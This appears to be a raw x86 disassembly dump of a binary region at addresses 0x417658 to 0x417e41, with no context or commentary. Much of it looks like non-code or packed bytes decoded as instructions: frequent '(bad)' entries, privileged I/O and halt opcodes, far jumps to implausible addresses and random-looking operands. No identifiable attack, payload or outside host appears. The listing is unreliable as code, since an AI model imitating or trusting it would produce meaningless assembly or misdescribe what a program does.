  417658:	cmp    eax,0x813a1f11
  41765d:	imul   ebx,DWORD PTR [ebx+ebx*2-0x4488eab],0x6e
  417665:	std    
  417666:	dec    esi
  417667:	add    esi,eax
  417669:	dec    edx
  41766a:	mov    ecx,0x6eb1d077
  41766f:	sti    
  417670:	jbe    0x417648
  417672:	mov    ds:0x32fde960,al
  417677:	sbb    dl,BYTE PTR [ecx]
  417679:	call   0x28ba:0x393254f6
  417680:	sbb    al,0xb
  417682:	imul   DWORD PTR [edi+0x5e]
  417685:	sbb    eax,0x736e2aca
  41768a:	xchg   ecx,eax
  41768b:	lods   al,BYTE PTR ds:[esi]
  41768c:	jo     0x4176bd
  41768e:	daa    
  41768f:	adc    DWORD PTR [ecx+0x249f74c1],esp
  417695:	push   edx
  417696:	into   
  417697:	inc    esi
  417698:	pushf  
  417699:	ret    0xade3
  41769c:	ins    DWORD PTR es:[edi],dx
  41769d:	sub    esp,DWORD PTR [esi+ebx*4]
  4176a0:	cwde   
  4176a1:	mov    dh,0x23
  4176a3:	mov    al,0x7
  4176a5:	jb     0x417662
  4176a7:	adc    BYTE PTR [ecx+0x16c567db],cl
  4176ad:	pop    ds
  4176ae:	sbb    esi,DWORD PTR [ecx+0x2e]
  4176b1:	xor    BYTE PTR [ebx-0x4cf6bc83],0xb5
  4176b8:	repnz int3 
  4176ba:	pop    ebx
  4176bb:	stc    
  4176bc:	push   ds
  4176bd:	mov    dh,0x7
  4176bf:	jg     0x41766f
  4176c1:	call   0xa807:0x2807137b
  4176c8:	mov    cl,0x69
  4176ca:	sbb    al,0x57
  4176cc:	std    
  4176cd:	outs   dx,DWORD PTR ds:[esi]
  4176ce:	adc    esp,eax
  4176d0:	fsubp  st(5),st
  4176d2:	push   ecx
  4176d3:	jns    0x41770e
  4176d5:	mov    al,ds:0xb58368f4
  4176da:	std    
  4176db:	and    BYTE PTR [eax],bl
  4176dd:	pusha  
  4176de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176df:	adc    dh,BYTE PTR [eax+0x67]
  4176e2:	packuswb mm4,mm0
  4176e5:	jnp    0x417717
  4176e7:	ret    0xbceb
  4176ea:	mov    dh,0xaf
  4176ec:	xor    dh,al
  4176ee:	out    dx,eax
  4176ef:	ins    BYTE PTR es:[edi],dx
  4176f0:	aad    0x13
  4176f2:	inc    edx
  4176f3:	sar    BYTE PTR [ebx],cl
  4176f5:	and    eax,0x93b3fe3f
  4176fa:	out    dx,al
  4176fb:	inc    edi
  4176fc:	mov    dl,0x0
  4176fe:	pop    esp
  4176ff:	cwde   
  417700:	push   cs
  417701:	mov    ds:0xd8b104f8,al
  417706:	(bad)  
  417707:	loop   0x417689
  417709:	add    bl,BYTE PTR [edi-0x79]
  41770c:	cld    
  41770d:	push   0x8a51f189
  417712:	cmp    al,0xae
  417714:	stos   BYTE PTR es:[edi],al
  417715:	pop    esi
  417716:	imul   edx,DWORD PTR [ecx-0x7c],0x23
  41771a:	mov    fs,WORD PTR [ebx+ebx*1]
  41771d:	(bad)  
  41771e:	sbb    esp,ebx
  417720:	(bad)  
  417722:	push   eax
  417723:	pop    ds
  417724:	mov    eax,0x2f4407c7
  417729:	lods   al,BYTE PTR ds:[esi]
  41772a:	and    esp,0x6c
  41772d:	fwait
  41772e:	je     0x417721
  417730:	sbb    BYTE PTR [eax],0xc0
  417733:	dec    edi
  417734:	aas    
  417735:	cmp    DWORD PTR [edi-0xc4c67d3],ebp
  41773b:	mov    ch,0xf9
  41773d:	add    al,0x1f
  41773f:	rol    BYTE PTR [eax],1
  417741:	mov    WORD PTR [ebp+0x3bd91a12],gs
  417747:	(bad)  
  417748:	fstp   DWORD PTR [esi+0x31]
  41774b:	popa   
  41774c:	hlt    
  41774d:	xchg   BYTE PTR cs:[esi-0x41],al
  417751:	pop    es
  417752:	(bad)  
  417753:	xor    DWORD PTR [edx-0x54],esi
  417756:	cli    
  417757:	mov    dh,0x90
  417759:	icebp  
  41775a:	pop    ds
  41775b:	lea    edx,[ebp-0x447779d]
  417761:	mov    ch,0x8f
  417763:	jle    0x4177a5
  417765:	rcr    DWORD PTR [edx+0x467952a7],0x97
  41776c:	push   edx
  41776d:	hlt    
  41776e:	scas   al,BYTE PTR es:[edi]
  41776f:	ds aam 0x60
  417772:	dec    esi
  417773:	das    
  417774:	ja     0x417707
  417776:	stos   DWORD PTR es:[edi],eax
  417777:	sub    dl,BYTE PTR [esi-0x3a6a4a4d]
  41777d:	sbb    al,0x89
  41777f:	add    BYTE PTR [esi-0x3b],bh
  417782:	aaa    
  417783:	test   ebx,edi
  417785:	js     0x41772c
  417787:	ret    0xa683
  41778a:	cmp    ebx,DWORD PTR [eax-0x1a44496f]
  417790:	fmulp  st(0),st
  417792:	enter  0xe60e,0xc4
  417796:	repz mov al,0xc8
  417799:	popf   
  41779a:	jae    0x41772b
  41779c:	adc    al,al
  41779e:	inc    esp
  41779f:	js     0x41774f
  4177a1:	adc    eax,0xe7730414
  4177a6:	or     dh,BYTE PTR [ecx-0x6d621cb9]
  4177ac:	push   eax
  4177ad:	push   ss
  4177ae:	adc    ecx,DWORD PTR [edi]
  4177b0:	je     0x417794
  4177b2:	push   esp
  4177b3:	ror    DWORD PTR [eax-0x5b42236e],0x5d
  4177ba:	stos   BYTE PTR es:[edi],al
  4177bb:	ins    BYTE PTR es:[edi],dx
  4177bc:	fnstcw WORD PTR [ebp-0x4e]
  4177bf:	xor    al,bl
  4177c1:	push   0x9d724f8a
  4177c6:	das    
  4177c7:	iret   
  4177c8:	sub    ebx,DWORD PTR [ebp-0x47f1b823]
  4177ce:	mov    WORD PTR [ecx],ss
  4177d0:	sub    DWORD PTR [ebp-0x29],ebp
  4177d3:	mov    ds:0x76ffaf4d,eax
  4177d8:	push   esp
  4177d9:	call   0xde84f5f4
  4177de:	mov    al,ds:0x2283b365
  4177e3:	inc    edi
  4177e4:	and    DWORD PTR [ebp-0x11e37096],eax
  4177ea:	pop    edx
  4177eb:	pop    esi
  4177ec:	repz jl 0x417840
  4177ef:	sub    bh,BYTE PTR [edx-0x5b3a9245]
  4177f5:	(bad)  
  4177f6:	loopne 0x41782a
  4177f8:	mov    eax,0x10e5a0b0
  4177fd:	xor    eax,0x28f186dd
  417802:	stos   BYTE PTR es:[edi],al
  417803:	xor    al,0x75
  417805:	stos   DWORD PTR es:[edi],eax
  417806:	sub    ecx,esp
  417808:	mov    eax,DWORD PTR [ebx+0x262308b0]
  41780e:	jo     0x4177ae
  417810:	xor    eax,0x67c10d08
  417815:	pop    esi
  417816:	pop    ebx
  417817:	leave  
  417818:	ret    0x10
  41781b:	dec    ebp
  41781c:	push   ebp
  41781d:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  417823:	mov    esp,ebp
  417825:	or     ah,dh
  417827:	dec    ebp
  417828:	add    bh,al
  41782a:	add    BYTE PTR [eax],cl
  41782c:	add    BYTE PTR [eax],al
  41782e:	mov    DWORD PTR [eax],0x40f44545
  417834:	xor    DWORD PTR [eax],eax
  417836:	test   DWORD PTR [ebx-0x34070b64],ecx
  41783c:	(bad)  
  41783d:	enter  0x4d45,0xbc
  417841:	mov    esi,DWORD PTR [eax]
  417843:	hlt    
  417844:	test   ebx,ecx
  417846:	pushf  
  417847:	enter  0x4df8,0x8b
  41784b:	mov    DWORD PTR [ebp-0x20],0x890208
  417852:	inc    ebp
  417853:	inc    ebp
  417854:	cld    
  417855:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41785b:	or     BYTE PTR [ebx+0x0],dl
  41785e:	mov    ebx,0x8bd5500
  417863:	call   DWORD PTR [ecx-0x1]
  417866:	pop    es
  417867:	mov    ch,0x33
  417869:	dec    ebx
  41786b:	(bad)  
  41786c:	mov    eax,0x72009ca4
  417871:	push   DWORD PTR [edx]
  417873:	or     BYTE PTR [eax],al
  417875:	jmp    0xff89:0x75c84d03
  41787c:	dec    ebp
  41787d:	loopne 0x41784f
  41787f:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  417885:	add    BYTE PTR [ebx],dh
  417887:	mov    ecx,ebx
  417889:	hlt    
  41788a:	add    ecx,ebx
  41788c:	enter  0x899c,0x32
  417890:	dec    ebp
  417891:	add    ecx,eax
  417893:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  417899:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4178a0:	xor    ecx,ebx
  4178a2:	retf   
  4178a3:	enter  0x4d03,0xc8
  4178a7:	mov    DWORD PTR fs:[eax],ebx
  4178aa:	lea    eax,[eax]
  4178ac:	push   esp
  4178ad:	mov    edi,edi
  4178af:	fs (bad) 
  4178b1:	(bad)  
  4178b2:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4178b8:	push   0xffffffff
  4178ba:	and    bh,bh
  4178bc:	pop    ecx
  4178bd:	inc    eax
  4178be:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4178c4:	push   0xffffff8b
  4178c6:	pop    ecx
  4178c7:	cld    
  4178c8:	dec    ebp
  4178c9:	lea    ecx,[ecx+0x45ff08ff]
  4178cf:	mov    BYTE PTR [edx+0x1],cl
  4178d2:	add    BYTE PTR [eax],al
  4178d4:	mov    DWORD PTR [ebp+0x8],0x58008d
  4178db:	dec    DWORD PTR [ebp-0x77]
  4178de:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4178e5:	cld    
  4178e6:	dec    ebp
  4178e7:	jne    0x41791c
  4178e9:	lea    eax,[ebx]
  4178eb:	push   eax
  4178ec:	mov    edi,edi
  4178ee:	or     BYTE PTR [ecx+0x54a845],cl
  4178f4:	add    al,ch
  4178f6:	(bad)  
  4178f7:	sub    esp,ebp
  4178f9:	add    BYTE PTR [eax],al
  4178fb:	rol    BYTE PTR [eax],0x84
  4178fe:	inc    ebp
  4178ff:	add    dh,BYTE PTR [esi+0x0]
  417902:	add    BYTE PTR [ebp-0x73],al
  417905:	mov    ebp,DWORD PTR [esp+edx*4]
  417908:	inc    DWORD PTR [eax]
  41790a:	lea    ecx,[ebx-0x30074f4]
  417910:	call   0x428495
  417915:	add    BYTE PTR [ebp+0x0],cl
  417918:	jne    0x41795b
  41791a:	dec    DWORD PTR [ebx-0x76210314]
  417920:	dec    ebp
  417921:	add    DWORD PTR [ebp+0x0],esi
  417924:	(bad)  
  417925:	xchg   ebp,eax
  417926:	loopne 0x417927
  417928:	inc    eax
  417929:	inc    DWORD PTR [eax]
  41792b:	mov    ecx,DWORD PTR [ebp-0x4]
  41792e:	xor    edx,DWORD PTR [edx+0x7201b8]
  417934:	add    BYTE PTR [edx],dl
  417936:	enter  0x4d90,0x0
  41793a:	mov    eax,DWORD PTR [eax]
  41793c:	hlt    
  41793d:	add    al,0xa5
  41793f:	mov    al,0xff
  417941:	add    bh,bh
  417943:	add    BYTE PTR [ebx],dh
  417945:	inc    DWORD PTR [ebx]
  417947:	sbb    al,0x89
  417949:	jne    0x417923
  41794b:	mov    esp,DWORD PTR [ecx+0x4500fc]
  417951:	mov    eax,DWORD PTR [ebp-0xff0048]
  417957:	mov    DWORD PTR [eax-0x70],0xee58ed89
  41795e:	inc    DWORD PTR [ebp-0x75]
  417961:	fisttp QWORD PTR [eax+eiz*8]
  417964:	test   DWORD PTR [esi-0x1],esp
  417967:	inc    ebp
  417968:	(bad)  
  417969:	aas    
  41796a:	inc    ebp
  41796b:	(bad)  
  41796c:	lea    edi,[esp+eiz*2-0x1]
  417970:	inc    edi
  417972:	mov    DWORD PTR ds:0x8000c7a0,edi
  417978:	mov    ebp,esi
  41797a:	cld    
  41797b:	in     al,0x8d
  41797d:	inc    ebp
  41797e:	jmp    eax
  417980:	(bad)  
  417981:	fisttp WORD PTR [eax+0x8801c7]
  417987:	jecxz  0x4179ce
  417989:	out    dx,al
  41798a:	inc    DWORD PTR [ebp-0x4]
  41798d:	out    0x8d,eax
  41798f:	aas    
  417990:	inc    edi
  417992:	jmp    FWORD PTR [eax-0x78]
  417995:	inc    DWORD PTR [ecx]
  417997:	mov    DWORD PTR [eax],0xc7a83d
  41799d:	ins    BYTE PTR es:[edi],dx
  41799e:	test   edi,edi
  4179a0:	pandn  mm0,mm5
  4179a3:	aas    
  4179a4:	add    bh,al
  4179a6:	mov    esi,DWORD PTR [eax-0x4]
  4179a9:	inc    DWORD PTR [eax+0xdf01e0]
  4179af:	(bad)  
  4179b0:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4179b4:	mov    ebp,ebx
  4179b6:	xchg   esp,eax
  4179b7:	fild   DWORD PTR [eax]
  4179b9:	(bad)  
  4179ba:	mov    edi,DWORD PTR [eax+0x3]
  4179bd:	(bad)  
  4179be:	cmp    al,0xe7
  4179c0:	dec    ebp
  4179c1:	leave  
  4179c2:	mov    ebp,eax
  4179c4:	fsubr  DWORD PTR [ecx]
  4179c6:	add    BYTE PTR [eax],al
  4179c8:	lea    ecx,[ebx-0x7f0003b4]
  4179ce:	push   edx
  4179cf:	add    DWORD PTR [ebp+0x0],edx
  4179d2:	mov    esi,DWORD PTR [eax]
  4179d4:	mov    WORD PTR [ebx-0x7a750000],?
  4179da:	add    esi,DWORD PTR [ebp-0x78]
  4179dd:	mov    eax,DWORD PTR [eax]
  4179df:	cld    
  4179e0:	push   0x7d
  4179e2:	dec    DWORD PTR [ebx+0xd88c]
  4179e8:	push   edx
  4179e9:	mov    edx,DWORD PTR [ecx-0x4]
  4179ec:	call   DWORD PTR [eax+0x7d01fc]
  4179f2:	mov    ebx,edx
  4179f4:	cld    
  4179f5:	add    BYTE PTR [eax+0x560150],dl
  4179fb:	test   DWORD PTR [ebp+0x75],eax
  4179fe:	in     al,0x8b
  417a00:	in     al,dx
  417a01:	cld    
  417a02:	(bad)  
  417a03:	jge    0x417999
  417a05:	mov    esp,ebx
  417a07:	fsub   st,st(7)
  417a09:	add    bh,al
  417a0b:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  417a11:	add    edi,edi
  417a13:	add    bh,bh
  417a15:	mov    eax,0x50d800ed
  417a1a:	inc    ebp
  417a1b:	push   esi
  417a1c:	fisttp WORD PTR [ebx+0x4dc7f43f]
  417a22:	test   BYTE PTR [ebx],dh
  417a24:	fadd   DWORD PTR ds:0x4572c2
  417a2a:	jmp    0x4179ed
  417a2c:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  417a33:	inc    esi
  417a34:	jo     0x417a36
  417a36:	test   edi,eax
  417a38:	jmp    esp
  417a3a:	inc    DWORD PTR [eax]
  417a3c:	in     eax,dx
  417a3d:	add    al,bl
  417a3f:	jne    0x4179c6
  417a41:	mov    edi,edi
  417a43:	cld    
  417a44:	inc    DWORD PTR [ebp-0x12]
  417a47:	mov    esp,esp
  417a49:	mov    ah,0x85
  417a4b:	add    bh,bh
  417a4d:	call   0x119a351
  417a52:	ret    0x858b
  417a55:	cld    
  417a56:	inc    DWORD PTR [eax+0xe301ff]
  417a5c:	out    dx,al
  417a5d:	xor    BYTE PTR [ebp-0xff00cf],al
  417a63:	mov    ebx,ebp
  417a65:	cld    
  417a66:	jo     0x4179f1
  417a68:	or     DWORD PTR [ecx],eax
  417a6a:	add    BYTE PTR [eax],al
  417a6c:	push   eax
  417a6d:	add    DWORD PTR [ebp+0x45],eax
  417a70:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  417a76:	dec    DWORD PTR [ebx-0x3fda0318]
  417a7c:	add    BYTE PTR [ebp-0xbf0040],dl
  417a82:	inc    ebp
  417a83:	or     BYTE PTR [ebx-0x4faf0400],0x45
  417a8a:	add    DWORD PTR [ebx+0x459c00],ecx
  417a90:	mov    edi,edi
  417a92:	mov    eax,0xe80800ff
  417a97:	inc    ebp
  417a98:	sub    BYTE PTR [ebx-0x47000400],cl
  417a9e:	add    al,0x1
  417aa0:	rol    BYTE PTR [eax],0x1e
  417aa3:	jne    0x417aea
  417aa5:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  417aab:	inc    DWORD PTR [ecx]
  417aad:	call   0x86a2b2
  417ab2:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  417ab8:	call   0x41a2be
  417abd:	xor    bh,bh
  417abf:	push   edi
  417ac0:	adc    BYTE PTR [ebx-0x747423bb],al
  417ac6:	loopne 0x417aa4
  417ac8:	ret    
  417ac9:	loopne 0x417a67
  417acb:	xor    DWORD PTR [edx],0x31
  417ace:	cmp    edi,edi
  417ad0:	bswap  esp
  417ad2:	rol    BYTE PTR gs:[eax],0x5
  417ad6:	jmp    0x12c7c20
  417adb:	mov    eax,DWORD PTR [ebp-0x4]
  417ade:	add    BYTE PTR [eax+0xff0100],bh
  417ae4:	cld    
  417ae5:	jne    0x417b64
  417ae7:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  417aed:	push   ss
  417aee:	add    DWORD PTR [eax],eax
  417af0:	add    BYTE PTR [eax+0x7f],dl
  417af3:	inc    ebp
  417af4:	add    BYTE PTR [ebx+0x459850],cl
  417afa:	mov    edi,edi
  417afc:	test   al,0xff
  417afe:	add    BYTE PTR [eax],cl
  417b00:	inc    DWORD PTR [ebp-0x18]
  417b03:	jmp    DWORD PTR ds:0x4d7d00dc
  417b09:	adc    BYTE PTR [ebx+0x459cb9],cl
  417b0f:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  417b15:	pushf  
  417b16:	mov    eax,0x30132
  417b1b:	lea    esi,[ebp+0x2c]
  417b1e:	xor    edi,edi
  417b20:	(bad)  
  417b21:	call   0x140a28e
  417b26:	call   0x135a3b6
  417b2b:	jne    0x417ab8
  417b2d:	xor    edi,esp
  417b2f:	add    eax,DWORD PTR [eax+0xc018d]
  417b35:	push   DWORD PTR [eax]
  417b37:	call   0xcaa293
  417b3c:	int3   
  417b3d:	inc    DWORD PTR [ebp-0x14]
  417b40:	mov    ecx,DWORD PTR [ebp-0x28]
  417b43:	xor    eax,DWORD PTR [eax]
  417b45:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  417b4b:	(bad)  
  417b4c:	xchg   ebp,eax
  417b4d:	in     al,0xff
  417b4f:	add    bh,bh
  417b51:	add    BYTE PTR [ebp+0x45],dl
  417b54:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  417b5a:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  417b61:	mov    edi,edi
  417b63:	or     BYTE PTR [eax],cl
  417b65:	inc    ebp
  417b66:	test   DWORD PTR gs:[eax],eax
  417b69:	je     0x417bb0
  417b6b:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  417b71:	xor    edx,DWORD PTR [eax-0x73]
  417b74:	push   ebp
  417b75:	or     BYTE PTR [ebp+0x21007572],al
  417b7b:	inc    ebp
  417b7c:	in     al,dx
  417b7d:	mov    ebp,DWORD PTR [eax]
  417b7f:	mov    esp,0x648bc345
  417b84:	fmul   st,st(5)
  417b86:	add    BYTE PTR [ebx],ch
  417b88:	mov    eax,DWORD PTR [ebx]
  417b8a:	cld    
  417b8b:	loopne 0x417b4d
  417b8d:	inc    ebp
  417b8e:	push   ebp
  417b8f:	cmp    ebp,eax
  417b91:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  417b98:	cld    
  417b99:	fadd   DWORD PTR [eax+0x3b014d]
  417b9f:	jne    0x417bd1
  417ba1:	push   0xf8898557
  417ba6:	in     al,dx
  417ba7:	jne    0x417bee
  417ba9:	lea    eax,[ebx+0x72e8dcc8]
  417baf:	das    
  417bb0:	mov    eax,DWORD PTR [eax]
  417bb2:	mov    esp,0x33eb7545
  417bb7:	mov    edi,DWORD PTR [edi+0x4572bc]
  417bbd:	xor    eax,edi
  417bbf:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  417bc9:	rcl    BYTE PTR [eax-0x40],1
  417bcc:	inc    ebp
  417bcd:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  417bd5:	inc    ebp
  417bd6:	xchg   ebp,eax
  417bd7:	ud0    ebp,DWORD PTR [ebx]
  417bda:	inc    DWORD PTR [eax]
  417bdc:	retf   
  417bdd:	jbe    0x417bdf
  417bdf:	mov    dl,BYTE PTR [eax-0x80]
  417be2:	push   ebp
  417be3:	pop    ds
  417be4:	mov    ecx,DWORD PTR [esp+esi*8]
  417be7:	inc    eax
  417be8:	retf   
  417be9:	inc    ebp
  417bea:	iret   
  417beb:	jb     0x417bb5
  417bed:	mov    eax,DWORD PTR [edi]
  417bef:	enter  0x4545,0x1
  417bf3:	xor    DWORD PTR [eax],eax
  417bf5:	pushf  
  417bf6:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  417bfc:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  417c03:	dec    ebp
  417c04:	add    BYTE PTR [ebx],dh
  417c06:	inc    ebp
  417c07:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  417c0d:	xor    dl,BYTE PTR [edx]
  417c0f:	add    eax,DWORD PTR [ebp-0x77]
  417c12:	mov    eax,esp
  417c14:	fmul   DWORD PTR [ebp-0x3d]
  417c17:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  417c1e:	mov    DWORD PTR [ebp-0x28],eax
  417c21:	rol    DWORD PTR [ebp-0x64],1
  417c24:	xor    eax,edi
  417c26:	mov    ecx,0xff858db0
  417c2b:	clc    
  417c2c:	enter  0x4d45,0x32
  417c30:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  417c37:	test   esi,edi
  417c39:	clc    
  417c3a:	inc    DWORD PTR [ebp+0x45]
  417c3d:	cmp    al,0x8b
  417c3f:	pushf  
  417c40:	or     bh,al
  417c42:	enter  0x16a8,0x85
  417c46:	xor    eax,edi
  417c48:	pushf  
  417c49:	inc    ebp
  417c4a:	(bad)  
  417c4b:	ds cld 
  417c4d:	pushf  
  417c4e:	inc    ebp
  417c4f:	mov    edx,DWORD PTR [eax-0x28]
  417c52:	lock push ebp
  417c54:	add    BYTE PTR [ebx],dh
  417c56:	mov    DWORD PTR [ebx],eax
  417c58:	sar    BYTE PTR [ebx],1
  417c5a:	adc    BYTE PTR [edi],cl
  417c5c:	dec    ebp
  417c5d:	adc    al,0x8b
  417c5f:	add    al,dl
  417c61:	jmp    0x1027e31
  417c66:	jb     0x417cb5
  417c68:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  417c6e:	xor    ecx,DWORD PTR [ebp+0x3b]
  417c71:	xor    ecx,DWORD PTR [edi]
  417c73:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  417c77:	(bad)  
  417c79:	clc    
  417c7a:	enter  0x8400,0x8b
  417c7e:	pop    es
  417c7f:	mov    al,0x0
  417c81:	push   ebp
  417c82:	push   cs
  417c83:	xor    ecx,eax
  417c85:	xor    esp,ecx
  417c87:	add    ebp,DWORD PTR [eax]
  417c89:	add    esi,DWORD PTR [eax]
  417c8b:	(bad)  
  417c8d:	retf   0x55c8
  417c90:	repnz mov eax,DWORD PTR [ebp-0x10]
  417c94:	(bad)  
  417c95:	cli    
  417c96:	fdivr  st,st(1)
  417c98:	test   DWORD PTR [eax+edi*8],ecx
  417c9b:	dec    ebp
  417c9c:	inc    ebp
  417c9d:	xor    edi,DWORD PTR [eax-0x7167afd]
  417ca3:	add    BYTE PTR [ebp+0x0],al
  417ca6:	mov    ecx,DWORD PTR [ebp-0x28]
  417ca9:	mov    ecx,ebx
  417cab:	clc    
  417cac:	jne    0x417c79
  417cae:	mov    esi,0xd672d3
  417cb3:	into   
  417cb4:	into   
  417cb5:	scas   eax,DWORD PTR es:[edi]
  417cb6:	dec    ebp
  417cb7:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  417cbd:	sub    ecx,esi
  417cbf:	cmp    ecx,DWORD PTR [ebp+0x77]
  417cc2:	(bad)  
  417cc3:	mov    edi,eax
  417cc5:	mov    al,0x85
  417cc7:	mov    eax,edi
  417cc9:	add    BYTE PTR [ebp-0x75],al
  417ccc:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  417cd3:	xor    eax,DWORD PTR [ebp+0x4503f803]
  417cd9:	(bad)  
  417cdb:	retf   0x559c
  417cde:	(bad)  
  417cdf:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  417ce6:	inc    ebp
  417ce7:	add    eax,0xeb9c4d3f
  417cec:	(bad)  
  417ced:	mov    ecx,esp
  417cef:	lods   al,BYTE PTR ds:[esi]
  417cf0:	test   DWORD PTR [ebp-0x8],edx
  417cf3:	xor    ecx,DWORD PTR [ebp+0x33]
  417cf6:	mov    eax,DWORD PTR [ebx]
  417cf8:	lock add ecx,ebx
  417cfb:	bswap  esi
  417cfd:	retf   0x55d1
  417d00:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  417d06:	jmp    0x417d01
  417d08:	add    BYTE PTR ds:0xebc44d8b,al
  417d0e:	push   ebp
  417d0f:	mov    ebp,DWORD PTR [ebx]
  417d11:	test   al,0x8b
  417d13:	push   ebp
  417d14:	clc    
  417d15:	xor    ecx,ebx
  417d17:	xor    ecx,esi
  417d19:	add    edx,ecx
  417d1b:	add    eax,DWORD PTR [edx+0xca010f]
  417d21:	push   ebp
  417d22:	dec    ebp
  417d23:	mov    ecx,DWORD PTR [ebx-0x34050710]
  417d29:	stc    
  417d2a:	rol    DWORD PTR ds:0xebce4dd6,cl
  417d30:	scas   eax,DWORD PTR es:[edi]
  417d31:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  417d37:	xor    ebp,DWORD PTR [ebx]
  417d39:	xor    edi,DWORD PTR [ebx]
  417d3b:	add    esi,DWORD PTR [edi+0x3]
  417d3e:	mov    ecx,DWORD PTR [edi]
  417d40:	clc    
  417d41:	retf   0x55cb
  417d44:	into   
  417d45:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  417d4c:	mov    eax,0x3376554d
  417d51:	mov    esi,DWORD PTR [ebx]
  417d53:	int3   
  417d54:	add    edx,DWORD PTR [ebp+0x3]
  417d57:	xor    ecx,DWORD PTR [edi]
  417d59:	xor    ecx,edx
  417d5b:	add    edx,DWORD PTR [ebp+0x3]
  417d5e:	mov    ecx,DWORD PTR [edi]
  417d60:	lock retf 0x4dfa
  417d64:	stc    
  417d65:	mov    ecx,DWORD PTR [eax]
  417d67:	or     BYTE PTR [ebp+0x4d],cl
  417d6a:	jmp    0x1057dfa
  417d6f:	dec    ebp
  417d70:	dec    ebp
  417d71:	(bad)  
  417d72:	mov    ebx,esp
  417d74:	clc    
  417d75:	test   ebx,ecx
  417d77:	clc    
  417d78:	ror    DWORD PTR [ebp-0x2a],cl
  417d7b:	mov    esi,ecx
  417d7d:	call   0x33ccc331
  417d82:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  417d89:	retf   
  417d8a:	ja     0x417d5a
  417d8c:	mov    ebp,DWORD PTR [eax-0x48]
  417d8f:	dec    ebp
  417d90:	xor    ecx,DWORD PTR [di+0x3]
  417d94:	mov    esp,esp
  417d96:	clc    
  417d97:	push   ebp
  417d98:	retf   
  417d99:	mov    dl,bl
  417d9b:	adc    esi,edx
  417d9d:	jb     0x417d6d
  417d9f:	add    BYTE PTR [edi-0x3b7474b3],ch
  417da5:	call   0x4d6d4927
  417daa:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  417db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db1:	pushf  
  417db2:	inc    ebp
  417db3:	xor    cl,BYTE PTR [ebp-0x78]
  417db6:	mov    edx,edi
  417db8:	clc    
  417db9:	dec    ebp
  417dba:	retf   
  417dbb:	mov    edx,ebx
  417dbd:	call   0x56105198
  417dc2:	scas   eax,DWORD PTR es:[edi]
  417dc3:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  417dc9:	pushf  
  417dca:	sub    esi,DWORD PTR [edx]
  417dcc:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  417dd2:	lods   al,BYTE PTR ds:[esi]
  417dd3:	xor    esp,DWORD PTR [ebx]
  417dd5:	add    ecx,DWORD PTR [ebp-0x1c]
  417dd8:	mov    edi,DWORD PTR [ebp-0x8]
  417ddb:	mov    bl,cl
  417ddd:	cmp    dl,bl
  417ddf:	jb     0x417daf
  417de1:	add    dh,dl
  417de3:	dec    ebp
  417de4:	scas   eax,DWORD PTR es:[edi]
  417de5:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  417deb:	shr    DWORD PTR [ebx],cl
  417ded:	into   
  417dee:	cmp    edx,esi
  417df0:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  417df6:	dec    ebp
  417df7:	dec    ebp
  417df8:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  417dfe:	retf   
  417dff:	xor    edx,esi
  417e01:	add    ecx,esi
  417e03:	imul   ecx,edx
  417e06:	mov    DWORD PTR [ebp+0x8],edx
  417e09:	xor    ecx,DWORD PTR [ebp+0x2b]
  417e0c:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  417e12:	add    esi,DWORD PTR [ebx]
  417e14:	mov    ah,0x3
  417e16:	inc    ebp
  417e17:	rdtsc  
  417e19:	xlat   BYTE PTR ds:[ebx]
  417e1a:	pushf  
  417e1b:	jge    0x417da6
  417e1d:	xor    ebx,eax
  417e1f:	sub    eax,DWORD PTR [ebp-0x73]
  417e22:	(bad)  
  417e23:	cmp    al,al
  417e25:	jb     0x417dac
  417e27:	add    al,bh
  417e29:	ror    DWORD PTR [ebp-0x7a],1
  417e2c:	xor    edi,edi
  417e2e:	add    edi,edi
  417e30:	jmp    0x417e7f
  417e32:	mov    ecx,DWORD PTR [ebx-0x34341324]
  417e38:	dec    ebp
  417e39:	into   
  417e3a:	mov    ebp,DWORD PTR [edi-0x23737428]
  417e40:	pushf  
  417e41:	shl    DWORD PTR [edx],cl
